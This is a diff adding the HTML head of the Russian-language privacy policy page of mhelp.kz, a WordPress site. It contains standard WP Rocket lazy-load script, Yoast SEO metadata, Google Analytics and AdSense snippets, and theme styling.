@@ -1,0 +1,576 @@
+<html lang="ru-RU"><head><meta charset="utf-8"><script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>class RocketLazyLoadScripts{constructor(){this.triggerEvents=["keydown","mousedown","mousemove","touchmove","touchstart","touchend","wheel"],this.userEventHandler=this._triggerListener.bind(this),this.touchStartHandler=this._onTouchStart.bind(this),this.touchMoveHandler=this._onTouchMove.bind(this),this.touchEndHandler=this._onTouchEnd.bind(this),this.clickHandler=this._onClick.bind(this),this.interceptedClicks=[],window.addEventListener("pageshow",e=>{this.persisted=e.persisted}),window.addEventListener("DOMContentLoaded",()=>{this._preconnect3rdParties()}),this.delayedScripts={normal:[],async:[],defer:[]},this.trash=[],this.allJQueries=[]}_addUserInteractionListener(e){if(document.hidden){e._triggerListener();return}this.triggerEvents.forEach(t=>window.addEventListener(t,e.userEventHandler,{passive:!0})),window.addEventListener("touchstart",e.touchStartHandler,{passive:!0}),window.addEventListener("mousedown",e.touchStartHandler),document.addEventListener("visibilitychange",e.userEventHandler)}_removeUserInteractionListener(){this.triggerEvents.forEach(e=>window.removeEventListener(e,this.userEventHandler,{passive:!0})),document.removeEventListener("visibilitychange",this.userEventHandler)}_onTouchStart(e){"HTML"!==e.target.tagName&&(window.addEventListener("touchend",this.touchEndHandler),window.addEventListener("mouseup",this.touchEndHandler),window.addEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.addEventListener("mousemove",this.touchMoveHandler),e.target.addEventListener("click",this.clickHandler),this._renameDOMAttribute(e.target,"onclick","rocket-onclick"),this._pendingClickStarted())}_onTouchMove(e){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler),e.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(e.target,"rocket-onclick","onclick"),this._pendingClickFinished()}_onTouchEnd(e){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler)}_onClick(e){e.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(e.target,"rocket-onclick","onclick"),this.interceptedClicks.push(e),e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),this._pendingClickFinished()}_replayClicks(){window.removeEventListener("touchstart",this.touchStartHandler,{passive:!0}),window.removeEventListener("mousedown",this.touchStartHandler),this.interceptedClicks.forEach(e=>{e.target.dispatchEvent(new MouseEvent("click",{view:e.view,bubbles:!0,cancelable:!0}))})}_waitForPendingClicks(){return new Promise(e=>{this._isClickPending?this._pendingClickFinished=e:e()})}_pendingClickStarted(){this._isClickPending=!0}_pendingClickFinished(){this._isClickPending=!1}_renameDOMAttribute(e,t,i){e.hasAttribute&&e.hasAttribute(t)&&(event.target.setAttribute(i,event.target.getAttribute(t)),event.target.removeAttribute(t))}_triggerListener(){this._removeUserInteractionListener(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this._loadEverythingNow.bind(this)):this._loadEverythingNow()}_preconnect3rdParties(){let e=[];document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(t=>{if(t.hasAttribute("src")){let i=new URL(t.src).origin;i!==location.origin&&e.push({src:i,crossOrigin:t.crossOrigin||"module"===t.getAttribute("data-rocket-type")})}}),e=[...new Map(e.map(e=>[JSON.stringify(e),e])).values()],this._batchInjectResourceHints(e,"preconnect")}async _loadEverythingNow(){this.lastBreath=Date.now(),this._delayEventListeners(this),this._delayJQueryReady(this),this._handleDocumentWrite(),this._registerAllDelayedScripts(),this._preloadAllScripts(),await this._loadScriptsFromList(this.delayedScripts.normal),await this._loadScriptsFromList(this.delayedScripts.defer),await this._loadScriptsFromList(this.delayedScripts.async);try{await this._triggerDOMContentLoaded(),await this._triggerWindowLoad()}catch(e){console.error(e)}window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this._waitForPendingClicks().then(()=>{this._replayClicks()}),this._emptyTrash()}_registerAllDelayedScripts(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(e=>{e.hasAttribute("data-rocket-src")?e.hasAttribute("async")&&!1!==e.async?this.delayedScripts.async.push(e):e.hasAttribute("defer")&&!1!==e.defer||"module"===e.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(e):this.delayedScripts.normal.push(e):this.delayedScripts.normal.push(e)})}async _transformScript(e){return await this._littleBreath(),new Promise(t=>{function i(){e.setAttribute("data-rocket-status","executed"),t()}function r(){e.setAttribute("data-rocket-status","failed"),t()}try{let n=e.getAttribute("data-rocket-type"),s=e.getAttribute("data-rocket-src");if(n?(e.type=n,e.removeAttribute("data-rocket-type")):e.removeAttribute("type"),e.addEventListener("load",i),e.addEventListener("error",r),s)e.src=s,e.removeAttribute("data-rocket-src");else if(navigator.userAgent.indexOf("Firefox/")>0){var a=document.createElement("script");[...e.attributes].forEach(e=>{"type"!==e.nodeName&&a.setAttribute("data-rocket-type"===e.nodeName?"type":e.nodeName,e.nodeValue)}),a.text=e.text,e.parentNode.replaceChild(a,e),i()}else e.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(e.text)))}catch(o){r()}})}async _loadScriptsFromList(e){let t=e.shift();return t&&t.isConnected?(await this._transformScript(t),this._loadScriptsFromList(e)):Promise.resolve()}_preloadAllScripts(){this._batchInjectResourceHints([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}_batchInjectResourceHints(e,t){var i=document.createDocumentFragment();e.forEach(e=>{let r=e.getAttribute&&e.getAttribute("data-rocket-src")||e.src;if(r){let n=document.createElement("link");n.href=r,n.rel=t,"preconnect"!==t&&(n.as="script"),e.getAttribute&&"module"===e.getAttribute("data-rocket-type")&&(n.crossOrigin=!0),e.crossOrigin&&(n.crossOrigin=e.crossOrigin),e.integrity&&(n.integrity=e.integrity),i.appendChild(n),this.trash.push(n)}}),document.head.appendChild(i)}_delayEventListeners(e){let t={};function i(e,i){!function e(i){!t[i]&&(t[i]={originalFunctions:{add:i.addEventListener,remove:i.removeEventListener},eventsToRewrite:[]},i.addEventListener=function(){arguments[0]=r(arguments[0]),t[i].originalFunctions.add.apply(i,arguments)},i.removeEventListener=function(){arguments[0]=r(arguments[0]),t[i].originalFunctions.remove.apply(i,arguments)});function r(e){return t[i].eventsToRewrite.indexOf(e)>=0?"rocket-"+e:e}}(e),t[e].eventsToRewrite.push(i)}function r(e,t){let i=e[t];Object.defineProperty(e,t,{get:()=>i||function(){},set(r){e["rocket"+t]=i=r}})}i(document,"DOMContentLoaded"),i(window,"DOMContentLoaded"),i(window,"load"),i(window,"pageshow"),i(document,"readystatechange"),r(document,"onreadystatechange"),r(window,"onload"),r(window,"onpageshow")}_delayJQueryReady(e){let t;function i(i){if(i&&i.fn&&!e.allJQueries.includes(i)){i.fn.ready=i.fn.init.prototype.ready=function(t){return e.domReadyFired?t.bind(document)(i):document.addEventListener("rocket-DOMContentLoaded",()=>t.bind(document)(i)),i([])};let r=i.fn.on;i.fn.on=i.fn.init.prototype.on=function(){if(this[0]===window){function e(e){return e.split(" ").map(e=>"load"===e||0===e.indexOf("load.")?"rocket-jquery-load":e).join(" ")}"string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=e(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach(t=>{delete Object.assign(arguments[0],{[e(t)]:arguments[0][t]})[t]})}return r.apply(this,arguments),this},e.allJQueries.push(i)}t=i}i(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>t,set(e){i(e)}})}async _triggerDOMContentLoaded(){this.domReadyFired=!0,await this._littleBreath(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),window.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._littleBreath(),document.rocketonreadystatechange&&document.rocketonreadystatechange()}async _triggerWindowLoad(){await this._littleBreath(),window.dispatchEvent(new Event("rocket-load")),await this._littleBreath(),window.rocketonload&&window.rocketonload(),await this._littleBreath(),this.allJQueries.forEach(e=>e(window).trigger("rocket-jquery-load")),await this._littleBreath();let e=new Event("rocket-pageshow");e.persisted=this.persisted,window.dispatchEvent(e),await this._littleBreath(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted})}_handleDocumentWrite(){let e=new Map;document.write=document.writeln=function(t){let i=document.currentScript;i||console.error("WPRocket unable to document.write this: "+t);let r=document.createRange(),n=i.parentElement,s=e.get(i);void 0===s&&(s=i.nextSibling,e.set(i,s));let a=document.createDocumentFragment();r.setStart(a,0),a.appendChild(r.createContextualFragment(t)),n.insertBefore(a,s)}}async _littleBreath(){Date.now()-this.lastBreath>45&&(await this._requestAnimFrame(),this.lastBreath=Date.now())}async _requestAnimFrame(){return document.hidden?new Promise(e=>setTimeout(e)):new Promise(e=>requestAnimationFrame(e))}_emptyTrash(){this.trash.forEach(e=>e.remove())}static run(){let e=new RocketLazyLoadScripts;e._addUserInteractionListener(e)}}RocketLazyLoadScripts.run();</script>
+	<!--[if IE]>
+	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=edge" /><![endif]-->
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+			<style type="text/css">
+					.heateor_sss_button_instagram span.heateor_sss_svg,a.heateor_sss_instagram span.heateor_sss_svg{background:radial-gradient(circle at 30% 107%,#fdf497 0,#fdf497 5%,#fd5949 45%,#d6249f 60%,#285aeb 90%)}
+											.heateor_sss_horizontal_sharing .heateor_sss_svg,.heateor_sss_standard_follow_icons_container .heateor_sss_svg{
+							color: #fff;
+						border-width: 0px;
+			border-style: solid;
+			border-color: transparent;
+		}
+					.heateor_sss_horizontal_sharing .heateorSssTCBackground{
+				color:#666;
+			}
+					.heateor_sss_horizontal_sharing span.heateor_sss_svg:hover,.heateor_sss_standard_follow_icons_container span.heateor_sss_svg:hover{
+						border-color: transparent;
+		}
+		.heateor_sss_vertical_sharing span.heateor_sss_svg,.heateor_sss_floating_follow_icons_container span.heateor_sss_svg{
+							color: #fff;
+						border-width: 0px;
+			border-style: solid;
+			border-color: transparent;
+		}
+				.heateor_sss_vertical_sharing .heateorSssTCBackground{
+			color:#666;
+		}
+						.heateor_sss_vertical_sharing span.heateor_sss_svg:hover,.heateor_sss_floating_follow_icons_container span.heateor_sss_svg:hover{
+						border-color: transparent;
+		}
+		@media screen and (max-width:783px) {.heateor_sss_vertical_sharing{display:none!important}}div.heateor_sss_mobile_footer{display:none;}@media screen and (max-width:783px){div.heateor_sss_bottom_sharing .heateorSssTCBackground{background-color:white}div.heateor_sss_bottom_sharing{width:100%!important;left:0!important;}div.heateor_sss_bottom_sharing a{width:14.285714285714% !important;}div.heateor_sss_bottom_sharing .heateor_sss_svg{width: 100% !important;}div.heateor_sss_bottom_sharing div.heateorSssTotalShareCount{font-size:1em!important;line-height:28px!important}div.heateor_sss_bottom_sharing div.heateorSssTotalShareText{font-size:.7em!important;line-height:0px!important}div.heateor_sss_mobile_footer{display:block;height:40px;}.heateor_sss_bottom_sharing{padding:0!important;display:block!important;width:auto!important;bottom:-2px!important;top: auto!important;}.heateor_sss_bottom_sharing .heateor_sss_square_count{line-height:inherit;}.heateor_sss_bottom_sharing .heateorSssSharingArrow{display:none;}.heateor_sss_bottom_sharing .heateorSssTCBackground{margin-right:1.1em!important}}		</style>
+		<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+
+	<!-- This site is optimized with the Yoast SEO plugin v20.1 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Политика конфиденциальности » MHelp.kz</title><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=PT%20Serif%3A400%2C700%7COpen%20Sans%3A400%2C400italic%2C700%2C700italic&amp;subset=latin%2Ccyrillic&amp;display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT%20Serif%3A400%2C700%7COpen%20Sans%3A400%2C400italic%2C700%2C700italic&amp;subset=latin%2Ccyrillic&amp;display=swap" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT%20Serif%3A400%2C700%7COpen%20Sans%3A400%2C400italic%2C700%2C700italic&#038;subset=latin%2Ccyrillic&#038;display=swap" /></noscript>
+	<link rel="canonical" href="https://mhelp.kz/privacy-policy/">
+	<meta property="og:locale" content="ru_RU">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="Политика конфиденциальности » MHelp.kz">
+	<meta property="og:description" content="Настоящая Политика конфиденциальности (далее – Политика) устанавливает правила использования персональной информации, получаемой от пользователей сайта (далее – Пользователи) администратором сайта (https://mhelp.kz/) (далее – Компания). Настоящая Политика конфиденциальности применяется ко всем Пользователям Сайта. Все термины и определения, встречающиеся в тексте Политики толкуются в соответствии с действующим законодательством Республики Казахстан. Пользователи прямо соглашаются на обработку своих персональных ...">
+	<meta property="og:url" content="https://mhelp.kz/privacy-policy/">
+	<meta property="og:site_name" content="MHelp.kz: Время делиться знаниями [Юн Сергей]">
+	<meta property="article:publisher" content="https://www.facebook.com/yunsserg">
+	<meta property="article:modified_time" content="2020-02-04T14:55:46+00:00">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:site" content="@yunsergeycom">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://mhelp.kz/privacy-policy/","url":"https://mhelp.kz/privacy-policy/","name":"Политика конфиденциальности &raquo; MHelp.kz","isPartOf":{"@id":"https://mhelp.kz/#website"},"datePublished":"2020-02-04T06:23:30+00:00","dateModified":"2020-02-04T14:55:46+00:00","breadcrumb":{"@id":"https://mhelp.kz/privacy-policy/#breadcrumb"},"inLanguage":"ru-RU","potentialAction":[{"@type":"ReadAction","target":["https://mhelp.kz/privacy-policy/"]}]},{"@type":"BreadcrumbList","@id":"https://mhelp.kz/privacy-policy/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://mhelp.kz/"},{"@type":"ListItem","position":2,"name":"Политика конфиденциальности"}]},{"@type":"WebSite","@id":"https://mhelp.kz/#website","url":"https://mhelp.kz/","name":"MHelp.kz: Время делиться знаниями [Юн Сергей]","description":"О компьютерных знаниях и настройке государственных порталов Казахстана","publisher":{"@id":"https://mhelp.kz/#/schema/person/f6628e990ec9fe2efe7c3557a1dc5ff5"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://mhelp.kz/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"},{"@type":["Person","Organization"],"@id":"https://mhelp.kz/#/schema/person/f6628e990ec9fe2efe7c3557a1dc5ff5","name":"YunSergey","image":{"@type":"ImageObject","inLanguage":"ru-RU","@id":"https://mhelp.kz/#/schema/person/image/","url":"https://mhelp.kz/wp-content/uploads/2019/08/logo-500x500-krug-png-1.png","contentUrl":"https://mhelp.kz/wp-content/uploads/2019/08/logo-500x500-krug-png-1.png","width":500,"height":500,"caption":"YunSergey"},"logo":{"@id":"https://mhelp.kz/#/schema/person/image/"},"sameAs":["https://mhelp.pro/","https://www.facebook.com/yunsserg","https://www.instagram.com/yunsergeykz/","https://www.linkedin.com/in/yunsergey/","https://www.pinterest.com/yun_sergey/","https://twitter.com/yunsergeycom","https://www.youtube.com/user/SSERJ0/","https://ru.wikipedia.org/wiki/:Yunsergey"]}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel="dns-prefetch" href="//ajax.googleapis.com">
+<link rel="dns-prefetch" href="//www.googletagmanager.com">
+<link rel="dns-prefetch" href="//fonts.googleapis.com">
+<link rel="dns-prefetch" href="//pagead2.googlesyndication.com">
+<link href="https://fonts.gstatic.com" crossorigin="" rel="preconnect">
+<link rel="alternate" type="application/rss+xml" title="MHelp.kz: Время делиться знаниями [Юн Сергей] » Лента" href="https://mhelp.kz/feed/">
+<link rel="alternate" type="application/rss+xml" title="MHelp.kz: Время делиться знаниями [Юн Сергей] » Лента комментариев" href="https://mhelp.kz/comments/feed/">
+<link rel="stylesheet" id="wp-block-library-css" href="https://mhelp.kz/wp-includes/css/dist/block-library/style.min.css?ver=6.1.1" type="text/css" media="all">
+<link rel="stylesheet" id="classic-theme-styles-css" href="https://mhelp.kz/wp-includes/css/classic-themes.min.css?ver=1" type="text/css" media="all">
+<style id="global-styles-inline-css" type="text/css">
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link data-minify="1" rel="stylesheet" id="basic-css" href="https://mhelp.kz/wp-content/cache/min/1/wp-content/themes/basic/style.css?ver=1674637611" type="text/css" media="all">
+
+<link data-minify="1" rel="stylesheet" id="basic-style-css" href="https://mhelp.kz/wp-content/cache/min/1/wp-content/themes/basic-child/style.css?ver=1674637611" type="text/css" media="all">
+<link data-minify="1" rel="stylesheet" id="heateor_sss_frontend_css-css" href="https://mhelp.kz/wp-content/cache/min/1/wp-content/plugins/sassy-social-share/public/css/sassy-social-share-public.css?ver=1674637611" type="text/css" media="all">
+
+<!-- Google Analytics snippet added by Site Kit -->
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://www.googletagmanager.com/gtag/js?id=UA-60253801-1" id="google_gtagjs-js" async=""></script>
+<script type="text/javascript" id="google_gtagjs-js-after">
+window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
+gtag('set', 'linker', {"domains":["mhelp.kz"]} );
+gtag("js", new Date());
+gtag("set", "developer_id.dZTNiMT", true);
+gtag("config", "UA-60253801-1", {"anonymize_ip":true});
+</script>
+
+<!-- End Google Analytics snippet added by Site Kit -->
+<link rel="https://api.w.org/" href="https://mhelp.kz/wp-json/"><link rel="alternate" type="application/json" href="https://mhelp.kz/wp-json/wp/v2/pages/3"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://mhelp.kz/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://mhelp.kz/wp-includes/wlwmanifest.xml">
+<meta name="generator" content="WordPress 6.1.1">
+<link rel="shortlink" href="https://mhelp.kz/?p=3">
+<link rel="alternate" type="application/json+oembed" href="https://mhelp.kz/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://mhelp.kz/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F&amp;format=xml">
+<link rel="dns-prefetch" href="https://mc.yandex.ru">
+<link rel="dns-prefetch" href="https://static.doubleclick.net">
+<link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+<link rel="dns-prefetch" href="https://ajax.googleapis.com/"><meta name="generator" content="Site Kit by Google 1.93.0">		
+<!-- BEGIN social meta -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Политика конфиденциальности">
+<meta property="og:description" content="">
+<meta property="og:image" content="">
+<meta property="og:url" content="https://mhelp.kz/privacy-policy/">
+<meta property="og:site_name" content="MHelp.kz: Время делиться знаниями [Юн Сергей]">
+<link rel="image_src" href="">
+<!-- END social meta -->
+
+<!-- BEGIN Customizer CSS -->
+<style type="text/css" id="basic-customizer-css">.sitetitle{position:relative}.logo{position:absolute;top:0;left:0;width:100%;z-index:1;}a:hover,#logo,.bx-controls a:hover .fa{color:#d20000}a:hover{color:#d20000}blockquote,q,input:focus,textarea:focus,select:focus{border-color:#d20000}input[type=submit],input[type=button],button,.submit,.button,.woocommerce #respond input#submit.alt,.woocommerce a.button.alt,.woocommerce button.button.alt, .woocommerce input.button.alt,.woocommerce #respond input#submit.alt:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,#mobile-menu,.top-menu,.top-menu .sub-menu,.top-menu .children,.more-link,.nav-links a:hover,.nav-links .current,#footer{background-color:#d20000}@media screen and (max-width:1023px){.topnav{background-color:#d20000}}</style>
+<!-- END Customizer CSS -->
+
+<!-- Google AdSense snippet added by Site Kit -->
+<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
+<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
+<!-- End Google AdSense snippet added by Site Kit -->
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #f7f7f7; }
+</style>
+	
+<!-- Google AdSense snippet added by Site Kit -->
+<script type="rocketlazyloadscript" async="async" data-rocket-src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2835762081184079&amp;host=ca-host-pub-2644536267352236" crossorigin="anonymous" data-rocket-type="text/javascript"></script>
+
+<!-- End Google AdSense snippet added by Site Kit -->
+<link rel="icon" href="https://mhelp.kz/wp-content/uploads/2016/07/cropped-favicon-mhelp.kz_-1-1-32x32.png" sizes="32x32">
+<link rel="icon" href="https://mhelp.kz/wp-content/uploads/2016/07/cropped-favicon-mhelp.kz_-1-1-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://mhelp.kz/wp-content/uploads/2016/07/cropped-favicon-mhelp.kz_-1-1-180x180.png">
+<meta name="msapplication-TileImage" content="https://mhelp.kz/wp-content/uploads/2016/07/cropped-favicon-mhelp.kz_-1-1-270x270.png">
+		<style type="text/css" id="wp-custom-css">
+			/* img    {-webkit-filter: grayscale(100%);
+	filter: grayscale(100%);}
+a {color: black} */		</style>
+		<script type="rocketlazyloadscript">var ajaxUrlFlatPM = "https://mhelp.kz/wp-admin/admin-ajax.php", duplicateFlatPM = true, untilscrollFlatPM = ".flat_pm_end"</script><noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript>
+</head>
